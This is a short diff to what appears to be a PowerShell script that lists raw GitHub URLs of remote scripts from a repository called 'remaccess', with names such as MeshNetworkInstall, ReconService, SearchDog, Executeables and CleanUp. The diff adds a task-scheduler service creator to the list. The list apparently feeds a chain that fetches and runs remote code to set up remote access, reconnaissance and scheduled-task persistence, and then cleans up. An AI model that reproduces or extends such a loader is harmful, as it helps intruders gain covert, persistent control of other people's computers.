@@ -48,6 +48,7 @@ $actions = @(
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/MeshNetworkInstall.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/SearchDog.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/ReconService.ps1",
+    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/TaskSchedulerServiceCreater.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/PingTaskSchedulerCreator.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/Executeables.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/CleanUp.ps1"
